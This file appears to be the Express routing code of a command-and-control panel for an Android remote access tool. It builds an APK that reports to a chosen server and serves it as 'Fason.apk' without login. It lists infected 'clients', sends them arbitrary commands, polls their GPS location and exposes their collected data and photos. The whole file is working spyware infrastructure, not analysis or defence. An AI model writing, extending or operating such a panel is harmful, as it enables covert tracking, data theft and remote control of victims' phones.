const express = require('express');
const path = require('path');
const fs = require('fs');
const config = require('../config/config');
const db = require('../database/db');
const clients = require('../clients/clients');
const { logger, getLogs, clearLogs, getStats } = require('../logs/logs');
const builder = require('../builder/builder');
const { auth, checkRateLimit, setupRoutes, startCleanup } = require('../auth/auth');

const router = express.Router();

// Request logging middleware
function logRequest(req, res, next) {
    const start = Date.now();
    res.on('finish', () => {
        const duration = Date.now() - start;
        if (req.path !== '/builder/progress' && !req.path.startsWith('/api/clients')) {
            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${duration}ms)`, 'http');
        }
    });
    next();
}

router.use(logRequest);
router.use(checkRateLimit);

// Setup auth routes (login/logout)
setupRoutes(router);

// Start rate limit cleanup
startCleanup();

// Dashboard
router.get('/', auth, (req, res) => {
    try {
        const online = clients.online();
        const offline = clients.offline();
        
        res.render('index', { 
            online, 
            offline,
            stats: {
                total: online.length + offline.length,
                online: online.length,
                offline: offline.length
            }
        });
    } catch (e) {
        logger.systemError('Dashboard render failed', e);
        res.status(500).send('Internal error');
    }
});

// Builder
router.get('/builder', auth, (req, res) => {
    res.render('builder');
});

router.post('/builder', auth, (req, res) => {
    try {
        const { serverUrl, homePageUrl } = req.body;
        
        if (!serverUrl) {
            logger.warning('Build attempted without server URL', 'build');
            return res.json({ error: 'Server URL is required' });
        }
        
        // Validate URL
        try {
            const url = new URL(serverUrl.startsWith('http') ? serverUrl : `http://${serverUrl}`);
        } catch (e) {
            return res.json({ error: 'Invalid server URL' });
        }
        
        logger.buildStart(serverUrl);
        
        builder.buildApk(serverUrl, homePageUrl, (err) => {
            if (err) {
                logger.buildFailed(err);
                res.json({ error: err });
            } else {
                logger.buildSuccess(serverUrl);
                res.json({ success: true });
            }
        });
    } catch (e) {
        logger.systemError('Builder route failed', e);
        res.json({ error: e.message });
    }
});

router.get('/builder/progress', auth, (req, res) => {
    try {
        res.json({ progress: builder.getProgress() });
    } catch (e) {
        res.json({ progress: { step: 'error', message: 'Failed to get progress' } });
    }
});

// Logs
router.get('/logs', auth, (req, res) => {
    try {
        const { type, category, search, limit } = req.query;
        const logs = getLogs({ 
            type, 
            category, 
            search, 
            limit: limit ? Math.min(parseInt(limit), 1000) : 100 
        });
        const stats = getStats();
        res.render('logs', { logs, stats, filters: { type, category, search } });
    } catch (e) {
        logger.systemError('Logs render failed', e);
        res.status(500).send('Internal error');
    }
});

router.post('/logs/clear', auth, (req, res) => {
    try {
        clearLogs();
        res.json({ success: true });
    } catch (e) {
        logger.systemError('Clear logs failed', e);
        res.json({ error: e.message });
    }
});

// API: Get log stats
router.get('/api/logs/stats', auth, (req, res) => {
    try {
        res.json(getStats());
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Device management
router.get('/device/:id', auth, (req, res) => {
    res.redirect(`/device/${req.params.id}/info`);
});

router.get('/device/:id/:page', auth, (req, res) => {
    try {
        const { id, page } = req.params;
        const client = clients.get(id);
        
        if (!client) {
            return res.render('device', { id, page: 'notfound', data: {}, client: null });
        }
        
        const data = clients.getData(id, page) || {};
        res.render('device', { id, page, data, client });
    } catch (e) {
        logger.systemError('Device page render failed', e);
        res.status(500).send('Internal error');
    }
});

// Commands
router.post('/cmd/:id/:cmd', auth, (req, res) => {
    try {
        const { id, cmd } = req.params;
        const params = { ...req.query, ...req.body };
        
        clients.send(id, cmd, params, (err, msg) => {
            if (err) {
                res.json({ error: err });
            } else {
                res.json({ success: true, message: msg });
            }
        });
    } catch (e) {
        logger.systemError('Command route failed', e);
        res.json({ error: e.message });
    }
});

// GPS polling
router.post('/gps/:id/:interval', auth, (req, res) => {
    try {
        const { id, interval } = req.params;
        const intInterval = parseInt(interval) || 0;
        
        // Validate interval
        if (intInterval < 0 || intInterval > 3600) {
            return res.json({ error: 'Interval must be between 0 and 3600 seconds' });
        }
        
        const result = clients.setGps(id, intInterval);
        res.json({ success: result });
    } catch (e) {
        logger.systemError('GPS route failed', e);
        res.json({ error: e.message });
    }
});

// API: Get client data by page
router.get('/api/client/:id/:page', auth, (req, res) => {
    try {
        const { id, page } = req.params;
        const data = clients.getData(id, page);
        
        if (data) {
            res.json({ success: true, data });
        } else {
            res.json({ error: 'Client or page not found' });
        }
    } catch (e) {
        res.json({ error: e.message });
    }
});

// API: Get client list
router.get('/api/clients', auth, (req, res) => {
    try {
        res.json({
            online: clients.online(),
            offline: clients.offline(),
            total: clients.all().length
        });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// API: Get client info
router.get('/api/client/:id', auth, (req, res) => {
    try {
        const client = clients.get(req.params.id);
        if (client) {
            res.json(client);
        } else {
            res.json({ error: 'Client not found' });
        }
    } catch (e) {
        res.json({ error: e.message });
    }
});

// API: Delete client data
router.delete('/api/client/:id', auth, (req, res) => {
    try {
        const id = req.params.id;
        // Remove from database
        db.main.get('clients').remove({ id }).write();
        
        // Delete client DB file
        const clientDbPath = path.join(config.dbPath, 'clients', `${id}.json`);
        if (fs.existsSync(clientDbPath)) {
            fs.unlinkSync(clientDbPath);
        }
        
        res.json({ success: true });
    } catch (e) {
        logger.systemError('Delete client failed', e);
        res.json({ error: e.message });
    }
});

// API: Server stats
router.get('/api/stats', auth, (req, res) => {
    try {
        const stats = {
            clients: {
                online: clients.online().length,
                offline: clients.offline().length,
                total: clients.all().length
            },
            logs: getStats(),
            uptime: process.uptime(),
            memory: process.memoryUsage()
        };
        res.json(stats);
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Static downloads
router.use('/downloads', express.static(config.downloadsPath));
router.use('/photos', express.static(config.photosPath));

// Serve signed APK
router.get('/Fason.apk', (req, res) => {
    try {
        if (fs.existsSync(builder.signedApk)) {
            logger.info('APK downloaded', 'build');
            res.download(builder.signedApk, 'Fason.apk');
        } else {
            logger.warning('APK requested but not found', 'build');
            res.status(404).send('APK not found. Build one first using the Builder page.');
        }
    } catch (e) {
        logger.systemError('APK download failed', e);
        res.status(500).send('Internal error');
    }
});

// Error handler
router.use((err, req, res, next) => {
    logger.systemError('Unhandled route error', err);
    res.status(500).json({ error: 'Internal server error' });
});

module.exports = router;
